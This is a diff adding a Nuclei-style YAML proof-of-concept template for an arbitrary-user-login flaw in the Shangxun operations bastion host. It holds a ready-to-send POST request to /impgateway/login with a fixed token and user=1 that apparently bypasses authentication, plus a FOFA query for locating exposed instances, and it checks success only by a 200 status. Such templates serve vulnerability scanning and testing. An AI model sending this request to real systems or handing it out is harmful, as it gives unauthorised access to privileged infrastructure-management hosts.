@@ -1,0 +1,32 @@
+id: poc-eh7k19xzdz8txtbo
+info:
+  name: 上讯运维堡垒机 login 存在任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eh7k19xzdz8txtbo'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: eh7k19xzdz8txtbo
+    fofa: body="/default/switchlocale"||body="default/getloginhtml"
+http:
+- raw:
+  - 'POST /impgateway/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2702.11 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 45
+
+    Connection: close
+
+
+    token=lGLYkKyLa3nxCS9zibpO2g==&user=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
